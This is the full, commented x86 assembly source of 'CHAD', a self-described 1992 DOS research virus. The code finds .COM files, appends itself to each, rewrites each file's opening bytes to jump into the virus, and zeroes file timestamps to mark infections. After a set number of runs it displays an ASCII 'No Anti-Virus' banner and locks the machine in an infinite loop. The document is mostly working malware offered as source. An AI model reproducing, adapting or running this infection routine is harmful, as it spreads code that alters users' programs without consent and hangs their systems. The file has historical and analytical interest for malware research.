;***************************************************************************
;*                                                                         *
;*  CHAD - Research Virus Version 1.01              Date. 11th April 1992. *
;*                                                                         *
;*  Written By : *.****** (*** ******** *******)                           *
;*                                                                         *
;*  Non-Overwriting Virus To Persuade Users To Get Some Anti-Virus         *
;*                                        Software, While Having Some Fun. *
;***************************************************************************

CODE  Segment
      Assume CS:CODE

progr equ 100h

      org progr

virus_size    EQU vir_end-vir_start
variable_diff EQU variables_start-vir_start

chad:
      call vir_start                     ;call virus
      mov ah,4ch                         ;return to operating system
      int 21h                            ;thru' dos interrupt 21h

vir_start:
      call next_byte                     ;call next address

next_byte:
      pop ax                             ;get next_byte address
      sub ax,3                           ;get virus address
      pop di                             ;get program start address
      push ax                            ;save virus address

      mov si,ax                          ;get address of next_byte
      mov ax,variable_diff               ;add difference
      add si,ax                          ;get variables address

      push si                            ;save si
      mov ax,18                          ;counter = variables+18
      add si,ax                          ;and point to it
      mov al,byte [si]                   ;get byte in counter
      add al,1                           ;add 1 to it
      mov byte [si],al                   ;and save again
      and al,10                          ;set counter
      cmp al,10                          ;has it been copied 10 times?
      jnz over_chad                      ;if not jump over
      mov ax,03h                         ;jump over to message line 1
      add si,ax                          ;si = message
      mov cx,10                          ;set counter to print
print_chad:
      push cx                            ;save counter
      mov ah,0fh                         ;get current display page
      int 10h                            ;call bios routine
      mov ah,02h                         ;set cursor position
      mov dl,18                          ;set column
      mov dh,cl                          ;set line (backwards)
      add dh,5                           ;place in middle of screen
      int 10h                            ;call bios routine
      mov dx,si                          ;move to dx
      mov ah,09h                         ;print string 
      int 21h                            ;call dos
      pop cx                             ;restore counter
      add si,42                          ;point to next string
      loop print_chad                    ;loop 'till done
print_chad1:
      jmp print_chad1                    ;infinite loop
over_chad:
      pop si                             ;restore variables address
      pop ax                             ;get variables difference
      mov [si],ax                        ;and save
      mov ax,3                           ;move to old address
      sub di,ax                          ;start of .com file
      mov [si+2],di
      mov ax,[si+4]                      ;get two bytes from old code
      mov [di],ax                        ;and place at start of file
      mov al,[si+6]                      ;get last byte of old code
      mov [di+2],al                      ;and place at start of .COM file
  
      mov dx,si                          ;which is copied to destination
      mov ax,12                          ;add 3 to variables address
      add dx,ax                          ;and save file control block

;search for first
      mov ah,4eh                         ;search for first
      xor cx,cx                          ;attributes to search
      int 21h                            ;call dos
      jnc found_one                      ;if file found jump over
      jmp return_to_prog                 ;if no file found return to program

found_one:
      mov ah,2fh                         ;get DTA address into es:bx
      int 21h                            ;call dos
      mov ax,22                          ;jump over to time
      add bx,ax                          ;and point to it
      mov al,es:[bx]                     ;and place in ax
      and al,00000111b                   ;get seconds only
      cmp al,00h                         ;zero seconds?
      jnz infect_program                 ;if not infect program
      mov ah,4fh                         ;find next file
      int 21h                            ;call dos
      cmp ax,12h                         ;any more files left?
      jz return_to_prog                  ;no! return to program
      jmp short found_one                ;jump back

infect_program:
      mov dx,8                           ;jump to asciiz fcb
      add dx,bx                          ;add to bx
      mov ax,3d02h                       ;open file for writing
      int 21h                            ;call dos
      jnc continue                       ;continue if no error

      mov ah,4fh                         ;search for next
      xor cx,cx                          ;attributes to search
      int 21h                            ;call dos
      jc return_to_prog                  ;if no file found return to program
      jmp short found_one                ;jump forward if one found

continue:
      mov bx,ax                          ;transfer file handle to bx

;read first three bytes
      mov ah,3fh                         ;read file
      mov cx,3                           ;number of bytes to read
      mov dx,si                          ;point to buffer to read
      add dx,4
      int 21h                            ;call dos

      mov ax,4202h                       ;move file pointer to end of file
      xor cx,cx                          ;clear cx
      xor dx,dx                          ;clear dx
      int 21h                            ;call dos
      sub ax,3
      mov word [si+08h],ax               ;and store

      mov ah,40h                         ;write to file
      mov cx,virus_size                  ;set counter to write
      mov dx,[si]
      int 21h                            ;and write to file

      mov ax,4200h                       ;move file pointer to start of file
      xor cx,cx                          ;clear cx
      xor dx,dx                          ;clear dx
      int 21h                            ;call dos

      mov ah,40h                         ;write to file
      mov cx,3                           ;set counter to write
      mov di,si
      add di,9
      mov dx,di                          ;point to buffer to start
      int 21h                            ;and write to file

      mov ax,5701h                       ;set date & time
      xor cx,cx                          ;time set to zero
      xor dx,dx                          ;and date
      int 21h                            ;and do it
      mov ah,3eh                         ;close file
      int 21h                            ;thru' dos

return_to_prog:
      mov ax,cs                          ;get code segment
      mov es,ax                          ;reset extra segment
      mov ax,0100h                       ;start of .COM file
      mov di,ax                          ;set destination address
      jmp ax                             ;jump to start of program

variables_start:
      db 0,0
      db 0,0
old_add:
      db 0e8h,0,0
      db 0,0
jump_code:
      db 0e8h,0,0
fcb:
      db "*.COM",0
counter:
      db 0
date:
      db 0
time:
      db 0
chad1:
      db "абабабабабабабабабабабабабабабабабабабаба$"
      db "бабабабабабабабабабабабабабабабабабабабаб$"
      db "абабабаб       Software .....   абабабаба$"
      db "бабабаба WOT!!  No Anti - Virus бабабабаб$"
      db "абабабабабабабабабабабабабабабабабабабаба$"
      db "бабабабабабабабабаб    абабабабабабабабаб$"
      db "дбдбдбдбдбдбдWWбабд    бдедWWбдбдбдбдбдбд$"
      db "                Ё  O  O  Ё               $"
      db "                /        \               $"
      db "                  ______                 $"
chad2:
      db "CHAD Against Damaging Viruses ... Save Our Software. 1992.$"

variables_end:

vir_end:

CODE   ENDS

       END chad

